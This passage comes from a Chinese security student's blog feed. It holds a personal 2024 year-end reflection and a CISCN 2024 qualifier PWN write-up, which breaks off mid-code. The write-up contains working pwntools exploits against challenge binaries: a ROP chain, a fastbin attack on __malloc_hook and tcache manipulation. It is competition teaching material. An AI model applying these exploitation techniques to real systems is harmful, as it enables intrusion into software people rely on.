    <url>/2025/01/03/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="为什么25年写24年的年终总结？😰"><a href="#为什么25年写24年的年终总结？😰" class="headerlink" title="为什么25年写24年的年终总结？😰"></a>为什么25年写24年的年终总结？😰</h1><p>Man！因为沟槽的👮‍行政法学和沟槽的信安体系</p><p>妈妈生的，鼠鼠一个到时候拿工学学位的背法背锝死去活来</p><p>且不幸地食物中毒，差点给我干脱水了，悲</p><p>昨天刚逃离百京</p><p>今天一起来打开vx，发现同实验室一个师兄🐏了😰</p><p>自测了一下还好没事</p><p>命途多舛</p><p>悲</p><p>玩了一上午沟槽地鸣潮，突然<del>想起来年终总结还没写</del>有感而发</p><p>故记</p><h1 id="竞赛"><a href="#竞赛" class="headerlink" title="竞赛"></a>竞赛</h1><p>24年算是真实际意义上全国可飞的一年吧</p><p>年初去了郑州，座了2天究极牢，拿了ppsuc第一个强网线下奖，虽然是个三等，虽然鼠鼠基本没输出😭</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103192304.jpg" style="zoom:67%;" /><p>鼠鼠还以为有Iot，电烙铁、热风枪啥的全带了，然后一看win内核，v8，vm escape，直接小被一盖开摆了</p><p>和dbt、tel哥哥、时总他们吃了人生第一顿凌晨四点的海底捞😋</p><p>到了四月吧，终于打上了心心念念的西葫芦🗡</p><p>结果就应该去4个取证misc👴，iot那个板子把固件提完，搞完基本的就不知道了，赛后看了Nameless👴的赛后remake，才知道有这么多东西😰</p><p>最后还是三等，也算了弥补上一届的遗憾吧</p><p>因为离家比较近，老爹来杭州请我们恰饭，鼠鼠一个劲的给队友倒小麦果汁</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103193043.jpg" style="zoom:67%;" /><p>然后就是沟槽的铁三，鼠鼠不做评价</p><p>唯一值得提的就是鼠鼠规划出了500块从北京——福州的交通！</p><p>北京大兴飞温州龙湾，温州高铁到福州，简直是理财带师</p><p>回来后又到了喜闻乐见的国赛环节</p><p>这B protobuf没完了是吧👊</p><p>第一天糯了，python没跑出来就不做了，没想到硬逆10分钟结构体出来了😰</p><p>第二天inkey👴死磕了一道vm出来把山河哥哥他们抬到了全国rank 11</p><p>inkey ! inkey ! inkey ！</p><p>分区一开始紧张死，结果就是鼠鼠1h fix 3 attack 1，然后躺到结束了🤔</p><p>最后rank4，成功拿到了决赛的门票</p><p>那天的夕阳记忆尤新</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025010319131.jpg" style="zoom:67%;" /><p>决赛的可信反正又是依托</p><p>第一天awdp打完是rank20的样子</p><p>从scu往外走的路上，和高老师打电话汇报情况，然后发生了一件巨恐怖的事情</p><p>高老师发了一张我们四个人走路的照片过来，我回头看了好久都没有人😰</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103194548.jpg" style="zoom:67%;" /><p>太哈人了（老师没跟我们来啊😰）</p><p>第二天，很云境风格的渗透，周哥一个人渗透打到rank 11!</p><p>浩二牛逼！</p><p>后来复盘起来应该还能更高点，有个垃圾忘翻了</p><p>ps : 鼠鼠在旁边file location搜的CPU块冒烟了呜呜</p><p>最后是rank14，0psu3拿到了队史的第一个国一！</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103195045.jpg" style="zoom:67%;" /><p>翻图片直播的时候，发现只有我们的队名有特写，win! （脉动打钱）</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103195504.jpg" style="zoom:67%;" /><p>吃完烤鱼站在天桥上，看着下面的川流不息，感觉这一阶段终于能画上一个句号了</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103195336.jpg" style="zoom:67%;" /><p>后面就处于半退役状态了，开始转向渗透的学习</p><p>本来想打个蓝帽玩玩，没想到蓝帽自己没了😰</p><p>研究生国赛这个战绩有点难看，当战犯了就不提了</p><p>又是一年强网，和杭师组了一个联队玩，结束前10分钟憋了个qroute出来，也还行</p><p>网鼎属于是我和周哥两个半截身子入土的人被师兄和师弟拉出来打</p><p>反正没看懂赛制，就当去贵州旅游了</p><p>难绷的检疫合格</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103200345.jpg" style="zoom:67%;" /><p>结果半决赛我在当misc手🤡（这合适吗）</p><p>因为队伍配置挺不错的，每个赛道都有输出，最后也是突破了校队历史，进网鼎决赛</p><p>至于决赛，9分钟打完的核心靶标，说鸡毛😅？</p><p>因为见见要来网鼎当裁判</p><p>所以难得的有张和高老师的合影</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103200316.jpg" style="zoom:67%;" /><p>老师还请了酸汤火锅😋</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103200437.jpg" style="zoom:67%;" /><p>没能去成强网线下，遗憾不能见到圈圈</p><p>感觉这一年和圈圈聊了很多，<del>qjx我宣你！</del></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103205621.jpg"></p><p>然后啊，也该去和联考对线了</p><p>故事都有结尾，不是吗？</p><p>等鼠鼠一年后回来呜呜😭😭😭😭</p><h1 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h1><p>没啥好说的</p><p>比较好玩的也就是个射击课，打了才知道后座真压不住</p><p>当初练的靶子（什么弹道偏下）</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103201850.jpg" style="zoom:67%;" /><p>当初入学就没想着争保研资格</p><p>结果现在一看怎么21的同生源地的师兄师姐保了这么多😰</p><p>那只能梭哈联考了</p><p><del>再鞭尸一遍沟槽的👮‍行政法学和信息安全体系</del></p><h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>1月初回了趟高中，真的很怀念啊</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103202209.jpg" style="zoom:67%;" /><p>和谢老师去了趟长沙，用mz的话来说，寒假走在五一广场的路上，就是在练肘击</p><p>孟老师的话还是一如既往的精辟</p><p>在长沙一个天桥下看到的涂鸦，很美丽的精神状态，也是鼠鼠现在的精神状态😢</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103202537.jpg" style="zoom:67%;" /><p>多多在阳光下是真好看</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103202644.jpg" style="zoom:67%;" /><p>五一小长假和乐宝去了乌兰察布</p><p>怎么说呢，有点被网图诈骗🤔，物价也不低，略过</p><p>入手了第一台胶片机，旁轴7🗡 QL17M3的孙子QL17</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103203223.jpg" style="zoom: 67%;" /><p>暑假也就去了个杭州漫展，排到了十八的签售</p><p>也是在那时候开始了场照学习</p><p>中秋和dbt、eeee、sink在圆明园乱逛</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103204027.jpg" style="zoom: 67%;" /><p>eeee真的帅吧</p><p>是吧？</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103204149.png" style="zoom: 67%;" /><p>国庆去了西安，和猫罐合了照</p><p>罐真的好伟大的一张脸呜呜呜😭😭😭</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103203619.jpg" style="zoom: 67%;" /><p>陕西历史博物馆真的很棒！</p><p>“斗转星移，万物乾坤；中华文明，玉掷金声”</p><p>研究生国赛在NCC和高中同学碰面了</p><p>真是狠狠xm了</p><h1 id="感情"><a href="#感情" class="headerlink" title="感情"></a>感情</h1><p>还是没有（艹了）</p><p>pass</p><p>话说这个专栏是不是年年开，年年空白来着🤡</p><h1 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h1><p>完成了一部分</p><p>也失去了一部分</p><p>对于未来的展望，有吗，或许有</p><p>但还是实现的时候再记上吧，免得来年徒增感伤</p><p>​                                                                </p><p>2025.1.3 写于会稽山阴</p>]]></content>
    
    
    <categories>
      
      <category>shell之外</category>
      
    </categories>
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024初赛 PWN方向全wp</title>
    <link href="/2024/05/22/ciscn2024-quals/"/>
    <url>/2024/05/22/ciscn2024-quals/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00：写在一切之前"><a href="#0x00：写在一切之前" class="headerlink" title="0x00：写在一切之前"></a>0x00：写在一切之前</h1><p>pwn 4&#x2F;6</p><p>哎，平时摸的一切的鱼，都会在比赛的时候自食其果</p><p>被enllusion杀爆了呜呜呜😭😭😭😭，想当初鼠鼠还是和他基本在一个水平线上的呜呜</p><p>结果呢，努力的人去了N1，摆烂的人还在原地踏步</p><p>🤡</p><p>妈妈生的，emo完了也该骂骂这💩题了</p><p>去年protobuf出题了，今年还没完了是吧，两天都有</p><p>还有那j8 ptmalloc真的很好玩嘛？嗯？鼠鼠真的买不起house呜呜</p><h1 id="0x01：抽象の赛题"><a href="#0x01：抽象の赛题" class="headerlink" title="0x01：抽象の赛题"></a>0x01：抽象の赛题</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>经典go题，测个溢出，注意恢复一下栈上数据就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./gostack&#x27;</span>)<br><br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.133.80&#x27;</span>, <span class="hljs-number">32778</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./gostack&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br><span class="hljs-comment">#0x0000000000414217: mov rdi, rax; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;</span><br>magic = <span class="hljs-number">0x414217</span><br>pop_rax = <span class="hljs-number">0x000000000040f984</span><br>pop_rsi = <span class="hljs-number">0x000000000042138a</span><br>pop_rdx = <span class="hljs-number">0x00000000004944ec</span><br>syscall = <span class="hljs-number">0x00000000004616c9</span><br><br><span class="hljs-comment"># gdb.attach(p, &quot;b *0x4a0a97\nc\n&quot;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span><br>payload += p64(<span class="hljs-number">0xc000180000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4aa800</span>) + p64(<span class="hljs-number">0x4df040</span>) + p64(<span class="hljs-number">0xc000046d98</span>)<br>payload = payload.ljust(<span class="hljs-number">0x1d0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">0x4a295a</span>) + p64(magic) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">3</span>) + p64(magic) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(elf.bss(<span class="hljs-number">0x800</span>)) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(syscall)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(magic) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(syscall)<br>sla(<span class="hljs-string">b&#x27; :\n&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><p>2.23，好久没见了，改个topchunk size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.133.80&#x27;</span>, <span class="hljs-number">23833</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./chal&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;:\n&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;:\n&#x27;</span>, data)<br><br>sa(<span class="hljs-string">b&#x27;.\n&#x27;</span>, <span class="hljs-string">b&#x27;korey&#x27;</span>)<br><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>edit(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0xf91</span>))<br><br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0xf60</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show()<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>, libc.address)<br><br>add(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>delete()<br>edit(<span class="hljs-number">8</span>, p64(libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x13</span> + p64(libc.address + <span class="hljs-number">0xf03a4</span>))<br><br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-buf（赛后）"><a href="#ez-buf（赛后）" class="headerlink" title="ez_buf（赛后）"></a>ez_buf（赛后）</h2><p>👴是战犯，懒的逆结构体，结果发现10分钟就把结构体手搓出来了</p><p>然后打tcache bin管理器就行了</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto3&quot;</span><span class="hljs-comment">;</span><br><br>package heybro<span class="hljs-comment">;</span><br>message heybro &#123;<br>  optional bytes whatcon<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  optional sint64 whattodo<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  optional sint64 whatidx<span class="hljs-operator">=</span><span class="hljs-number">3</span><span class="hljs-comment">;</span><br>  optional sint64 whatsize<span class="hljs-operator">=</span><span class="hljs-number">4</span><span class="hljs-comment">;</span><br>  optional int32 whatsthis<span class="hljs-operator">=</span><span class="hljs-number">5</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctf_pb2<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.133.80&#x27;</span>, <span class="hljs-number">23833</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./chal&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>message = ctf_pb2.heybro()<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">no_action</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">0</span><br>    message.whatcon = msg<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, msg</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">1</span><br>    message.whatidx = idx<br>    message.whatcon = msg<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">2</span><br>    message.whatidx = idx<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx, msg ,size, this</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">3</span><br>    message.whatidx = idx<br>    message.whatcon = msg<br>    message.whatsize = size<br>    message.whatsthis = this<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><br><br>show(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;00000000&#x27;</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21ace0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>, libc.address)<br><br>delete(<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;00000000&#x27;</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>)<br>ru(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>heap_base = (u64(rc(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span>) - <span class="hljs-number">0x5000</span><br><br><br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span 